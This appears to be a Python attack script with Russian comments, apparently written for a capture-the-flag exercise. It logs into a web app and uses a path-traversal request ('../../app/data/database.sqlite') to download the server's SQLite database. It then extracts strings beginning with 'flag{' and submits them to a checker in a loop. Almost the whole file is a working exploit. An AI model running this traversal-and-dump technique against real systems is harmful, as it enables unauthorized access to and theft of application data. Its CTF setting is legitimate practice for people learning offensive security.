import requests
import sqlite3
import time


from settings import *


# === Инициализация ===

session = requests.Session() 

# ====== Логинимся =========
def login(login_url, session):
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Origin': login_url  
    }
    
    
    session.get(login_url, headers=headers)

    with open(LOGIN_FILE) as f:
        email = f.readline().strip()
        password = f.readline().strip()

    login_data = {'email': email, 'password': password}
    session.post(login_url, data=login_data, headers=headers)

#======== Скачиваем бд ==========
def download_db():
    print("Скачивание базы...")
    
    resp = session.get(f"{BASE_URL}/files?file=../../app/data/database.sqlite", timeout=30)
    if resp.status_code == 200:
        with open(DB_PATH, 'wb') as f:
            f.write(resp.content)
        print("База скачана!")
    else:
        raise Exception(f"Ошибка скачивания: {resp.status_code}")

#========== Вытаскиваем флаги из бд =========
def extract_flags_from_db():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT content FROM posts")  # Только уникальные значения
    rows = cursor.fetchall()
    conn.close()
    
    flags = {row[0] for row in rows if row[0].startswith("flag{")}
    print(f"Найдено {len(flags)} уникальных флагов.")
    return flags

#========== Проверям конкретный флаг =======
def check_flag(flag):
    try:
        resp = session.get(CHECK_URL + flag, timeout=10)
        if resp.text.strip() == "Верный флаг":
            print(f"✅ Верный флаг: {flag}")
            return True
        else:
            print(f"❌ Неверный: {flag}")
            return False
    except Exception as e:
        print(f"⚠️ Ошибка при проверке {flag}: {e}")
        return False

#========= Проверяем все флаги ==========
def check_flags(flags):
    for flag in flags:
        # если нашли нужный флаг, обрубаем
        if check_flag(flag):
            return 1
    return 0


# === Основной поток ===
try:
    login(LOGIN_URL,session)
    download_db()
    
    all_flags = extract_flags_from_db()


    # запускаем цикл проверки флагов
    try:
        while True:
            print("☠️ Начинаю проверять флаги... ☠️")
            time_start = time.time()
            if check_flags(all_flags):
                print("✅ Флаги проверены, найден нужный флаг!")
                
            else:
                print("🧐 Все флаги проверены.")

            time_finish = time.time()

            check_time = (time_finish - time_start)
            
            print(f"Проверка длилась {check_time:.3f} секунд!")
            print(f"😴 Поспим {SLEEP_TIME} секунд ...")
            time.sleep(SLEEP_TIME)
    except KeyboardInterrupt:
        print("\nCTRL+C...")

except Exception as e:
    print(f"❌ Ошибка: {e}")
